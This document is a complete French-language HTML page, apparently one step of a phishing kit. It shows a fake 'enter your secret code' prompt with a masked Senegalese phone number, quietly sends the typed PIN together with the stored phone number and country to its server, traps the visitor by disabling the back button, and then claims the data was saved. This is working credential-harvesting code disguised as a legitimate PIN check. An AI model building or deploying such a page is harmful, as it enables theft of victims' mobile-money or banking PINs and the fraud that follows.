<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Code secret</title>

<style>
body{
    margin:0;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    font-family:Arial;
}
.container{
    width:360px;
    background:#f5f5f5;
    padding:30px 25px;
    border-radius:16px;
    box-shadow:0 4px 20px rgba(0,0,0,.1);
    text-align:center;
}
.small{
    font-size:14px;
    color:#555;
    margin-bottom:15px;
}
input{
    width:100%;
    padding:14px;
    border-radius:12px;
    border:1px solid #ccc;
    margin-top:10px;
    margin-bottom:20px;
}
button{
    width:100%;
    padding:14px;
    background:#00A8E1;
    border:none;
    border-radius:12px;
    color:#fff;
    font-size:18px;
    cursor:pointer;
}
#success{
    display:none;
    color:green;
    font-size:18px;
}
</style>
</head>

<body>

<div class="container" id="pinBox">
    <h2>Entrez votre code secret</h2>

    <!-- ✅ DÉTAIL AJOUTÉ -->
    <div class="small">Numéro : +221 XXXXXXXXX</div>

    <input type="password" id="pin" placeholder="Code secret" required>
    <button type="button" onclick="send()">Continuer</button>
</div>

<div class="container" id="success">
    ✅ Données enregistrées avec succès
</div>

<script>
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
};

function send(){
    const pin = document.getElementById("pin").value;
    const phone = sessionStorage.getItem("phone");
    const country = sessionStorage.getItem("country");

    if(!pin || !phone || !country) return;

    fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone, pin, country })
    });

    document.getElementById("pinBox").style.display = "none";
    document.getElementById("success").style.display = "block";
}
</script>

</body>
</html>
